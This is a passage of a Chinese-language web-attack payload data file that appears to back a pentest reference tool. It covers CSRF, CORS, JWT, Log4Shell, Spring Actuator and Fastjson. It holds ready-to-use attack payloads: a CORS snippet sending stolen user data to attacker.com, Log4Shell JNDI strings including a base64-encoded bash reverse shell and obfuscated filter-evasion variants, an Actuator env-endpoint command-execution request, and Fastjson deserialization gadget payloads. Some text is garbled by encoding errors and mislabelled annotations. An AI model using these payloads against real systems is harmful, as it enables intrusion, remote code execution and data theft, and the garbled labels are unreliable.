          { part: 'Token不验证会话\n#', explanation: '关键参数', type: 'value' },
          { part: '攻击步骤:\n1.', explanation: '关键参数', type: 'value' },
          { part: '攻击者获取自己的Token\n2.', explanation: '关键参数', type: 'value' }
        ]
      },
      { 
        title: '3. Token泄露', 
        command: '# Token在URL中泄露\nhttp://target.com/page?token=xxx\n\n# Token在Referer中泄露\n从包含Token的页面跳转\n\n# Token在日志中泄露\n服务器日志记录Token', 
        description: '利用Token泄露', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'URL泄露', explanation: 'Token出现在URL中' },
          { part: 'Referer泄露', explanation: '通过Referer�泄露' }
        ]
      },
      { 
        title: '4. Token重放', 
        command: '# Token可重复使用\n# 攻击步骤:\n1. 获取有效Token\n2. 多次使用同一Token\n3. Token不过期或不失效', 
        description: 'Token重放攻击', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: 'Token可重复使用\n#', explanation: '关键参数', type: 'value' },
          { part: '攻击步骤:\n1.', explanation: '关键参数', type: 'value' },
          { part: '获取有效Token\n2.', explanation: '关键参数', type: 'value' }
        ]
      },
      { 
        title: '5. Token删除绕过', 
        command: '# 尝试删除Token参数\nPOST /action HTTP/1.1\n# 不发送Token参数\n\n# 尝试空Token\nPOST /action?token=\n\n# 尝试删除Token�', 
        description: '删除Token绕过', 
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: '# 尝试删除Token参数\nPOST /action HT', explanation: '绕过技术', type: 'technique' }
        ]
        },
      ],
    wafBypass: [
      { 
        title: '方法覆盖', 
        command: '# 使用_method参数\nPOST /action?_method=PUT&token=xxx\n\n# 使用X-HTTP-Method-Override\nX-HTTP-Method-Override: PUT',
            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' 使用_method参数\nPOST /action?_method=PUT&token=xxx\n\n# 使用X-HTTP-Method-Override\nX-HTTP-Method-Override: PUT', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '方法覆盖绕过', 
        platform: 'all'
      },
      { 
        title: 'JSON格式', 
        command: '# 使用JSON格式提交\nContent-Type: application/json\n{"token": "xxx", "action": "delete"}\n\n# 可能绕过Token验证',
            syntaxBreakdown: [
              { part: '# 使用JSON格式提交\nContent-Type: application/json\n{"token": "xxx", "action": "', explanation: 'SQL表达式', type: 'value' },
              { part: 'delete', explanation: 'SQL关键字', type: 'keyword' },
              { part: '"}\n\n# 可能绕过Token验证', explanation: 'SQL表达式', type: 'value' }
            ],
        description: 'JSON格式绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'CSRF Token绕过是最常见的CSRF防护绕过方式，通过分析Token生成算法、利用实现缺陷或结合其他漏洞(如XSS)来获取或预测有效的Token值。',
      vulnerability: 'CSRF Token实现缺陷包括：Token使用简单算法生成(如MD5(时间戳))可预测、Token在Cookie和表单中不一致但均被接受、Token未在服务端验证仅做前端校验、Token在URL参数中泄露(Referer头)、Token长度过短可爆破。',
      exploitation: '完�利用流程：\n1. 分析Token生成机制\n2. 检查Token绑定关系\n3. 尝试预测或获取Token\n4. 构造CSRF攻击',
      mitigation: '防御措施：\n1. 使用强随机Token\n2. Token绑定会话\n3. Token一次性使用\n4. 验证Token存在性',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'csrf-referer-bypass',
    name: 'Referer绕过技术',
    description: '绕过Referer验证的CSRF攻击',
    category: 'CSRF跨站请求伪造',
    subCategory: 'Referer绕过',
    tags: ['csrf', 'referer', 'bypass', 'header'],
    prerequisites: ['目标验证Referer�', '验证逻辑存在缺陷'],
    execution: [
      { 
        title: '1. 正则匹配绕过', 
        command: '# 正则只检查包含\nReferer: http://attacker.com/target.com/\nReferer: http://target.com.attacker.com/\nReferer: http://attacktarget.com/\n\n# 正则只检查开�\nReferer: http://target.com.attacker.com/\n\n# 正则只检查结尾\nReferer: http://attacker.com/target.com', 
        description: '利用正则匹配缺陷', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '包含匹配', explanation: '只检查是否包含域名' },
          { part: '开�匹配', explanation: '只检查开�' },
          { part: '结尾匹配', explanation: '只检查结尾' }
        ]
      },
      { 
        title: '2. 空Referer绕过', 
        command: '# 不发送Referer\n<meta name="referrer" content="no-referrer">\n\n# data URL\ndata:text/html,<script>CSRF</script>\n\n# about:blank\nabout:blank\n\n# HTTPS->HTTP降级\n从HTTPS站点跳转到HTTP', 
        description: '发送空Referer', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'no-referrer', explanation: '浏览器不发送Referer' },
          { part: 'data URL', explanation: 'data协议无源' }
        ]
      },
      { 
        title: '3. 子域名绕过', 
        command: '# 从子域名发起\nReferer: http://sub.target.com/attack\n\n# 从兄弟域名发起\nReferer: http://sibling.target.com/\n\n# 利用子域名XSS\n在子域名注入XSS发起CSRF', 
        description: '利用子域名', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: 'http://sub.target.com/attack\n\n#', explanation: '目标URL', type: 'value' },
          { part: '# 从子域名发起\nReferer: http://sub.', explanation: '绕过技术', type: 'technique' }
        ]
      },
      { 
        title: '4. Referrer-Policy利用', 
        command: '# origin-only\n<meta name="referrer" content="origin">\nReferer: http://target.com\n\n# origin-when-cross-origin\n<meta name="referrer" content="origin-when-cross-origin">', 
        description: '利用Referrer-Policy', 
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: 'http://target.com\n\n#', explanation: '目标URL', type: 'value' },
          { part: '# origin-only\n<meta name="ref', explanation: '利用载荷', type: 'value' }
        ]
        },
      ],
    wafBypass: [
      { 
        title: 'iframe嵌入', 
        command: '# 使用iframe嵌入目标\n<iframe src="http://target.com" referrerpolicy="no-referrer">\n\n# sandbox属性\n<iframe sandbox="allow-scripts" src="...">',
            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' 使用iframe嵌入目标\n<iframe src="http://target.com" referrerpolicy="no-referrer">\n\n# sandbox属性\n<iframe sandbox="allow-scripts" src="...">', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: 'iframe绕过', 
        platform: 'all'
      },
      { 
        title: 'Flash/SWF', 
        command: '# Flash可以控制Referer\n# 编译SWF发送自定义Referer',
            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' Flash可以控制Referer\n# 编译SWF发送自定义Referer', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: 'Flash控制Referer', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'Referer验证是CSRF防御的补充手段，但由于Referer头可被操纵或省略，基于Referer的防护通常不够可靠。多种技术可绕过不严格的Referer验证逻辑。',
      vulnerability: 'Referer绕过技术：1)使用Referrer-Policy: no-referrer不发送Referer头 2)HTTPS→HTTP降级不携带Referer 3)data: URI不发送Referer 4)正则匹配缺陷(如target.com.evil.com) 5)子域名绕过(sub.target.com)。',
      exploitation: '完�利用流程：\n1. 分析Referer验证逻辑\n2. 构造绕过域名\n3. 使用空Referer\n4. 执行CSRF攻击',
      mitigation: '防御措施：\n1. 严格验证Referer格式\n2. 拒绝空Referer\n3. 使用白名单验证\n4. 配合CSRF Token',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'csrf-flash',
    name: 'Flash CSRF攻击',
    description: '利用Flash进行CSRF攻击',
    category: 'CSRF跨站请求伪造',
    subCategory: 'Flash CSRF',
    tags: ['csrf', 'flash', 'swf', 'crossdomain'],
    prerequisites: ['目标允许Flash请求', 'crossdomain.xml配置不当'],
    execution: [
      { 
        title: '1. crossdomain.xml利用', 
        command: '# 检查crossdomain.xml\nhttp://target.com/crossdomain.xml\n\n# 允许所有域\n<cross-domain-policy>\n<allow-access-from domain="*"/>\n</cross-domain-policy>\n\n# 允许特定域\n<allow-access-from domain="*.target.com"/>', 
        description: '检查跨域策略文件', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'crossdomain.xml', explanation: 'Flash跨域策略文件' },
          { part: 'allow-access-from', explanation: '允许访问的域' }
        ]
      },
      { 
        title: '2. 创建恶意SWF', 
        command: '// ActionScript代码\npackage {\n  import flash.net.*;\n  public class CSRF {\n    public function CSRF() {\n      var req:URLRequest = new URLRequest("http://target.com/api/action");\n      req.method = URLRequestMethod.POST;\n      req.data = "param=value";\n      req.requestHeaders.push(new URLRequestHeader("Content-Type", "application/json"));\n      sendToURL(req);\n    }\n  }\n}', 
        description: '创建恶意Flash文件', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'URLRequest', explanation: 'Flash HTTP请求类' },
          { part: 'sendToURL', explanation: '发送请求' }
        ]
      },
      { 
        title: '3. 发送JSON请求', 
        command: '// Flash可以发送任意Content-Type\nreq.requestHeaders.push(\n  new URLRequestHeader("Content-Type", "application/json")\n);\nreq.data = JSON.stringify({email: "attacker@evil.com"});', 
        description: '发送JSON格式请求', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '//', explanation: '关键参数', type: 'value' },
          { part: 'new', explanation: '关键参数', type: 'value' }
        ]
      },
      { 
        title: '4. 自定义Header', 
        command: '// Flash可以添加自定义Header\nreq.requestHeaders.push(\n  new URLRequestHeader("X-Custom-Header", "value")\n);\n\n// 绕过某些Header验证', 
        description: '添加自定义Header', 
        syntaxBreakdown: [
          { part: '//', explanation: '关键参数', type: 'value' },
          { part: 'Flash可以添加自定义Header\nreq.requestHeaders.p', explanation: '关键参数', type: 'value' },
          { part: 'new', explanation: '关键参数', type: 'value' }
        ]
        },
      ],
    wafBypass: [
      { 
        title: '绕过预检请求', 
        command: '# Flash可以绕过CORS预检\n# �接发送POST请求\n# 携带Cookie',
            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' Flash可以绕过CORS预检\n# �接发送POST请求\n# 携带Cookie', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '绕过CORS预检', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'Flash CSRF利用Adobe Flash的跨域请求能力发送自定义Content-Type的HTTP请求，虽然Flash已于2020年末停止支持，但了解此技术对理解CSRF攻击演变仍有价值。',
      vulnerability: 'Flash CSRF的原理：SWF文件可通过URLRequest发送自定义Content-Type(如application/json)的跨域请求，绕过浏览器HTML表单的Content-Type限制。需目标域的crossdomain.xml配置允许跨域，或利用307重定向转发请求。',
      exploitation: '完�利用流程：\n1. 检查crossdomain.xml\n2. 创建恶意SWF\n3. 嵌入HTML页面\n4. 诱导用户访问',
      mitigation: '防御措施：\n1. 配置严格的crossdomain.xml\n2. 使用CSRF Token\n3. 验证Origin/Referer\n4. 禁用Flash支持',
      difficulty: 'advanced'
    }
  },
  {
    id: 'csrf-cors',
    name: 'CORS配置错误利用',
    description: '利用CORS配置错误进行CSRF攻击',
    category: 'CSRF跨站请求伪造',
    subCategory: 'CORS配置错误',
    tags: ['csrf', 'cors', 'misconfiguration', 'api'],
    prerequisites: ['CORS配置错误', '允许跨域携带凭证'],
    execution: [
      { 
        title: '1. 检测CORS配置', 
        command: '# 发送测试请求\ncurl -H "Origin: http://attacker.com" http://target.com/api\n\n# 检查响应�\nAccess-Control-Allow-Origin: http://attacker.com\nAccess-Control-Allow-Credentials: true\n\n# 危险配置\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true', 
        description: '检测CORS配置', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'Access-Control-Allow-Origin', explanation: '允许的源' },
          { part: 'Access-Control-Allow-Credentials', explanation: '允许携带凭证' }
        ]
      },
      { 
        title: '2. 反射Origin攻击', 
        command: '# 服务器反射任意Origin\nAccess-Control-Allow-Origin: [请求的Origin]\nAccess-Control-Allow-Credentials: true\n\n# 攻击代码\nfetch("http://target.com/api/sensitive", {\n  credentials: "include"\n})\n.then(r => r.json())\n.then(data => sendToAttacker(data));', 
        description: '利用反射Origin', 
        platform: 'all'
      },
      { 
        title: '3. null源攻击', 
        command: '# 允许null源\nAccess-Control-Allow-Origin: null\nAccess-Control-Allow-Credentials: true\n\n# 使用data URL\n<iframe src="data:text/html,<script>\nfetch(\'http://target.com/api\', {credentials: \'include\'})\n.then(r => r.json()).then(sendToAttacker);\n</script>"></iframe>', 
        description: '利用null源', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'null', explanation: 'data URL的Origin为null' }
        ]
      },
      { 
        title: '4. 正则绕过', 
        command: '# 正则匹配不严谨\n允许: target.com\n绕过: attacktarget.com\ntarget.com.attacker.com\n\n# 攻击代码\nfetch("http://target.com.api.attacker.com/api", {\n  credentials: "include"\n});', 
        description: '正则匹配绕过', 
        },
      ],
    wafBypass: [
      { 
        title: '窃取敏感数据', 
        command: '# 利用CORS窃取数据\nfetch("http://target.com/api/user", {\n  credentials: "include"\n})\n.then(r => r.json())\n.then(data => {\n  new Image().src = "http://attacker.com/log?data=" + encodeURIComponent(JSON.stringify(data));\n});',
            syntaxBreakdown: [
              { part: '# 利用CORS窃取数据\nfetch("http://target.com/api/user", {\n  credentials: "include"\n}', explanation: '攻击载荷', type: 'value' }
            ],
        description: '窃取用户数据', 
        platform: 'all'
      },
      { 
        title: '执行敏感操作', 
        command: '# 利用CORS执行操作\nfetch("http://target.com/api/delete", {\n  method: "POST",\n  credentials: "include",\n  headers: {"Content-Type": "application/json"},\n  body: JSON.stringify({id: 123})\n});',
            syntaxBreakdown: [
              { part: '# 利用CORS执行操作\nfetch("http://target.com/api/', explanation: 'SQL表达式', type: 'value' },
              { part: 'delete', explanation: 'SQL关键字', type: 'keyword' },
              { part: '", {\n  method: "POST",\n  credentials: "include",\n  headers: {"Content-Type": "application/json"},\n  body: JSON.stringify({id: 123})\n});', explanation: 'SQL表达式', type: 'value' }
            ],
        description: '执行敏感操作', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'CORS(Cross-Origin Resource Sharing)配置错误可被利用来绕过同源策略的CSRF防护，特别是当Access-Control-Allow-Origin反射请求的Origin头或配置为通配符时。',
      vulnerability: 'CORS相关CSRF风险：1)Access-Control-Allow-Origin反射任意Origin 2)配合Access-Control-Allow-Credentials: true泄露认证数据 3)内网域名在白名单中可从内网发起攻击 4)null Origin在白名单中(iframe sandbox可伪造)。',
      exploitation: '完�利用流程：\n1. 检测CORS配置\n2. 确认允许凭证\n3. 构造跨域请求\n4. 窃取数据或执行操作',
      mitigation: '防御措施：\n1. 使用白名单验证Origin\n2. 不反射Origin\n3. 谨慎设置Credentials\n4. 使用SameSite Cookie',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'jwt-security',
    name: 'JWT安全漏�',
    description: 'JSON Web Token安全漏�利用',
    category: 'API安全',
    subCategory: 'JWT',
    tags: ['jwt', 'token', 'authentication'],
    prerequisites: ['使用JWT进行认证', 'JWT配置或验证存在问题'],
    execution: [
      {
        title: '1. 解码JWT',
        command: `JWT格式: header.payload.signature
解码:
echo "HEADER" | base64 -d
echo "PAYLOAD" | base64 -d
或使用jwt.io`,
        description: '解码JWT内容',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'header', explanation: '算法和令牌类型', type: 'value' },
          { part: 'payload', explanation: '声明数据', type: 'value' },
          { part: 'signature', explanation: '签名验证', type: 'value' },
        ]
      },
      {
        title: '2. None算法攻击',
        command: `修改header为:
{"alg":"none","typ":"JWT"}
Base64编码后构造:
HEADER.PAYLOAD.
(签名部分为空)`,
        description: '使用None算法绕过签名验证',
        platform: 'all',
        syntaxBreakdown: [
          { part: '"alg":"none"', explanation: '指定无签名算法', type: 'value' },
        ]
      },
      {
        title: '3. 弱密钥�解',
        command: `使用hashcat�解:
hashcat -m 16500 jwt.txt wordlist.txt
使用jwt_tool:
python3 jwt_tool.py JWT_TOKEN -C -d wordlist.txt`,
        description: '�解弱密钥',
        platform: 'all',
        syntaxBreakdown: [
          { part: '-m 16500', explanation: 'hashcat JWT模式', type: 'value' },
        ]
      },
      {
        title: '4. 密钥混淆攻击',
        command: `将RS256算法改为HS256:
{"alg":"HS256","typ":"JWT"}
使用公钥作为HMAC密钥签名`,
        description: '算法混淆攻击',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'RS256', explanation: 'RSA非对称算法', type: 'value' },
          { part: 'HS256', explanation: 'HMAC对称算法', type: 'value' },
        ]
      },
      {
        title: '5. 修改Payload',
        command: `修改payload中的用户信息:
{"sub":"admin","iat":1234567890}
重新编码并使用已知密钥签名`,
        description: '修改JWT声明',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'sub', explanation: 'Subject声明，通常是用户ID', type: 'value' },
          { part: 'iat', explanation: '签发时�', type: 'value' },
        ]
      },
    ],
    wafBypass: [
      {
        title: 'JWK/JKU头部注入',
        command: `# JWK内嵌公钥注入:
# 在JWT Header中嵌入攻击者的公钥:
{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","n":"attacker_n","e":"AQAB"}}
# 服务端使用Header中的JWK验证签名

# JKU远程密钥集注入:
{"alg":"RS256","typ":"JWT","jku":"http://attacker.com/.well-known/jwks.json"}
# 服务端从攻击者控制的URL获取密钥`,
            syntaxBreakdown: [
              { part: '# JWK内嵌公钥注入:', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共7行', type: 'value' }
            ],
        description: '通过在JWT Header中注入jwk(内嵌密钥)或jku(远程密钥集URL)指向攻击者控制的密钥，使服务端使用攻击者密钥验证签名',
      },
      {
        title: 'x5c证书链注入',
        command: `# 生成自签名证书:
openssl req -x509 -nodes -newkey rsa:2048 -keyout attacker.key -out attacker.crt -subj "/CN=attacker"

# 构造JWT Header:
{"alg":"RS256","x5c":["ATTACKER_CERT_BASE64"]}

# 用攻击者私钥签名，x5c中放入攻击者证书
# 服务端从x5c提取公钥验证签名，攻击者自签即可通过

# 使用jwt_tool:
python3 jwt_tool.py <token> -X s -pr attacker.key`,
            syntaxBreakdown: [
              { part: '# 生成自签名证书:', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共8行', type: 'value' }
            ],
        description: '通过x5c头部注入攻击者自签证书链，使服务端从证书中提取公钥进行验证，攻击者用对应私钥签名即可伪造任意JWT',
      },
    ],
    tutorial: {
      overview: 'JWT(JSON Web Token)是现代Web应用中最常用的认证机制，其安全漏洞包括算法混淆(none/HS256→RS256)、密钥爆破、未验证签名、声明篡改等，可导致认证绕过和权限提升。',
      vulnerability: 'JWT安全漏洞：1)alg:none漏洞(不验证签名) 2)HS256/RS256算法混淆(用公钥作HMAC密钥) 3)弱密钥可被字典爆破 4)未验证exp导致永不过期 5)kid参数注入(目录遍历/SQL注入) 6)jku/x5u头指向恶意密钥。',
      exploitation: '完�利用流程：\n1. 获取JWT Token\n2. 解码分析内容\n3. 尝试None算法绕过\n4. 尝试�解弱密钥\n5. 修改Payload提权',
      mitigation: '防御措施：\n1. 使用强密钥\n2. 禁用None算法\n3. 正确验证签名\n4. 设置合理的过期时�\n5. 使用HTTPS传输',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'log4j-rce',
    name: 'Log4j RCE (Log4Shell)',
    description: 'Apache Log4j远程代码执行漏�',
    category: '框架漏洞',
    subCategory: 'Log4j',
    tags: ['log4j', 'rce', 'cve-2021-44228', 'log4shell'],
    prerequisites: ['使用Log4j 2.x版本', '用户输入被记录到日志'],
    execution: [
      { 
        title: '1. 探测漏�', 
        command: '在任意输入点注入:\n${jndi:ldap://attacker.com/test}\n观察是否有DNS回调', 
        description: '探测Log4j漏�', 
        platform: 'all',
      },
      { 
        title: '2. DNS外带测试', 
        command: '${jndi:ldap://${env:USER}.attacker.com}\n${jndi:ldap://${sys:java.version}.attacker.com}\n外带环境变量或系统属性', 
        description: '外带敏感信息', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '${env:USER}', explanation: '获取环境变量' },
          { part: '${sys:java.version}', explanation: '获取系统属性' }
        ]
      },
      { 
        title: '3. 构造恶意LDAP服务器', 
        command: '使用JNDIExploit或rogue-jndi:\njava -jar JNDIExploit.jar -i attacker.com\n构造payload:\n${jndi:ldap://attacker.com:1389/Basic/Command/base64/d2hvYW1p}', 
        description: '构造RCE payload', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'Basic/Command', explanation: '执行命令的LDAP路由' },
          { part: 'base64', explanation: 'Base64编码的命令' }
        ]
      },
      { 
        title: '4. 获取Shell', 
        command: '${jndi:ldap://attacker.com:1389/Basic/Command/base64/YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci80NDQ0IDA+JjE=}\nBase64解码为: bash -i >& /dev/tcp/attacker/4444 0>&1', 
        description: '获取反弹Shell', 
        platform: 'linux'
      }
    ],
    wafBypass: [
      { 
        title: '绕过关键字过滤', 
        command: '${${lower:j}ndi:ldap://attacker.com}\n${${upper:j}ndi:${lower:l}dap://attacker.com}\n${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com}', 
        description: '使用嵌套表达式绕过', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '${lower:j}', explanation: '将j转为小写' },
          { part: '${::-j}', explanation: '默认值语法' }
        ]
      },
      { 
        title: '绕过特殊字符过滤', 
        command: '${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.com}\n${jndi:dns://attacker.com}',
        description: '构造协议字符串', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'Log4Shell(CVE-2021-44228)是Apache Log4j 2.x的远程代码执行漏洞，通过JNDI注入(${jndi:ldap://...})在日志记录时触发远程类加载，影响数百万Java应用，是近年来最严重的安全漏洞之一。',
      vulnerability: 'Log4j JNDI注入利用日志消息中的${jndi:ldap://attacker/exploit}表达式触发LDAP/RMI远程类加载。受影响版本(2.0-2.14.1)在记录日志时自动解析嵌套表达式，攻击者控制任何被记录的输入(User-Agent/搜索词等)即可触发RCE。',
      exploitation: '完�利用流程：\n1. 找到用户输入被记录的点\n2. 注入JNDI payload\n3. 搭建恶意LDAP服务器\n4. 加载恶意类执行命令',
      mitigation: '防御措施：\n1. 升级Log4j到最新版本\n2. 设置formatMsgNoLookups=true\n3. 删除JndiLookup类\n4. 使用WAF过滤JNDI模式',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'spring-actuator',
    name: 'Spring Actuator漏�',
    description: 'Spring Boot Actuator端点安全漏�',
    category: '框架漏洞',
    subCategory: 'Spring',
    tags: ['spring', 'actuator', 'rce', 'java'],
    prerequisites: ['Spring Boot应用', 'Actuator端点�露'],
    execution: [
      {
        title: '1. 探测Actuator端点',
        command: `/actuator
/actuator/env
/actuator/health
/actuator/mappings
/actuator/configprops
/actuator/heapdump`,
        description: '探测�露的Actuator端点',
        platform: 'all',
        syntaxBreakdown: [
          { part: '/actuator', explanation: 'Actuator根端点', type: 'value' },
          { part: '/env', explanation: '环境变量端点', type: 'value' },
          { part: '/heapdump', explanation: '堆转储端点', type: 'value' },
        ]
      },
      {
        title: '2. 获取敏感信息',
        command: `/actuator/env
查看数据库密码、API密钥等
/actuator/configprops
查看配置属性`,
        description: '获取环境变量和配置',
        platform: 'all',
      },
      {
        title: '3. 下载堆转储',
        command: `curl -o heapdump http://target.com/actuator/heapdump
使用Memory Analyzer Tool分析
搜�password、secret等关键词`,
        description: '下载并分析堆转储',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'heapdump', explanation: 'JVM堆内存转储', type: 'value' },
        ]
      },
      {
        title: '4. env端点RCE',
        command: `POST /actuator/env
Content-Type: application/x-www-form-urlencoded
spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT('String exec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} return null;}')

POST /actuator/restart`,
        description: '通过env端点执行命令',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'POST', explanation: 'HTTP请求方法', type: 'method' },
          { part: '/actuator', explanation: 'Spring监控端点', type: 'path' }
        ]
      },
    ],
    wafBypass: [
      {
        title: '路径遍历与分号参数技巧',
        command: `# 分号路径参数绕过(Spring特性):
/;/actuator/env
/actuator;.js/env
/actuator/..;/actuator/env

# 双URL编码:
/%61%63%74%75%61%74%6f%72/env
/actuator/%65%6e%76

# 路径穿越:
/random/../actuator/env
/api/v1/../../actuator/heapdump`,
            syntaxBreakdown: [
              { part: '# 分号路径参数绕过(Spring特性):', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共10行', type: 'value' }
            ],
        description: 'Spring框架的分号路径参数特性允许在URL中插入分号段绕过路径匹配规则，结合双编码和路径穿越访问被限制的Actuator端点',
      },
      {
        title: 'HTTP方法覆盖与Content-Type绕过',
        command: `# HTTP方法覆盖:
GET /actuator/env HTTP/1.1
X-HTTP-Method-Override: POST

# Content-Type绕过:
POST /actuator/env HTTP/1.1
Content-Type: application/x-www-form-urlencoded
spring.cloud.bootstrap.location=http://attacker.com/payload.yml

# 大小写绕过:
/Actuator/Env
/ACTUATOR/ENV`,
            syntaxBreakdown: [
              { part: '# HTTP方法覆盖:', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共10行', type: 'value' }
            ],
        description: '使用X-HTTP-Method-Override头覆盖请求方法，或通过非标准Content-Type和大小写变体绕过WAF对Actuator端点的POST请求拦截',
      },
    ],
    tutorial: {
      overview: 'Spring Actuator提供了生产级别的监控和管理功能，配置不当可能泄露敏感信息或导�RCE。',
      vulnerability: 'Spring Boot Actuator暴露大量管理端点：/env泄露环境变量和数据库密码、/heapdump可下载JVM堆内存(含密钥/凭证)、/jolokia可通过JMX执行代码、/gateway/routes(Spring Cloud Gateway)可注入SpEL实现RCE。',
      exploitation: '完�利用流程：\n1. 探测�露的端点\n2. 获取环境变量和配置\n3. 下载堆转储分析\n4. 利用env端点RCE',
      mitigation: '防御措施：\n1. 限制Actuator端点访问\n2. 禁用敏感端点\n3. 使用Spring Security保护\n4. 生产环境禁用heapdump',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'fastjson-rce',
    name: 'Fastjson RCE',
    description: 'Alibaba Fastjson反序列化远程代码执行',
    category: '框架漏洞',
    subCategory: 'Fastjson',
    tags: ['fastjson', 'rce', 'deserialization', 'java'],
    prerequisites: ['使用Fastjson库', '存在反序列化点'],
    execution: [
      {
        title: '1. 探测Fastjson',
        command: `发送JSON请求，观察响应:
{"@type":"java.net.Inet4Address","val":"attacker.com"}
观察是否有DNS回调`,
        description: '探测Fastjson版本',
        platform: 'all',
        syntaxBreakdown: [
          { part: '@type', explanation: 'Fastjson类型指定', type: 'value' },
          { part: 'java.net.Inet4Address', explanation: '触发DNS解析的类', type: 'value' },
        ]
      },
      {
        title: '2. JNDI注入',
        command: `{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}`,
        description: 'JNDI注入RCE',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'JdbcRowSetImpl', explanation: '可利用的JDBC类', type: 'value' },
          { part: 'dataSourceName', explanation: 'JNDI数据源名称', type: 'value' },
          { part: 'autoCommit', explanation: '触发JNDI查找', type: 'value' },
        ]
      },
      {
        title: '3. 搭建恶意服务',
        command: `使用JNDIExploit:
java -jar JNDIExploit.jar -i attacker.com
或使用marshalsec:
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#Exploit 1389`,
        description: '搭建恶意LDAP/RMI服务',
        platform: 'all',
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: 'http://attacker.com:8080/#Exploit', explanation: '目标URL', type: 'value' }
        ]
      },
      {
        title: '4. 绕过AutoType检查',
        command: `1.2.47版本绕过:
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}}`,
        description: '绕过AutoType黑名单',
        platform: 'all',
        syntaxBreakdown: [
          { part: '1.2.47版本绕过:', explanation: '绕过技术', type: 'technique' },
          { part: '1.2.47版本绕过:', explanation: '关键参数', type: 'value' }
        ]
      },
    ],
    wafBypass: [
      {
        title: 'Unicode编码与嵌套JSON绕过',
        command: `# Unicode编码@type:
{"\u0040\u0074\u0079\u0070\u0065":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}

# 十六进制编码:
{"\x40type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}

# 嵌套JSON混淆:
{"a":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}}`,
            syntaxBreakdown: [
              { part: '# Unicode编码@type:', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共6行', type: 'value' }
            ],
        description: '通过Unicode(\u0040)、十六进制(\x40)编码@type字段名或嵌套JSON结构绕过WAF对Fastjson特征的检测',
      },
      {
        title: 'BCEL ClassLoader与版本特异链',
        command: `# BCEL ClassLoader(Fastjson 1.1.15-1.2.24):
{"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader","":"$$BCEL$$$l$8b..."}

# Fastjson 1.2.47 AutoType绕过:
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}}

# Fastjson 1.2.68 expectClass绕过:
{"@type":"java.lang.AutoCloseable","@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}`,
            syntaxBreakdown: [
              { part: '# BCEL ClassLoader(Fastjson 1.1.15-1.2.24):', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共6行', type: 'value' }
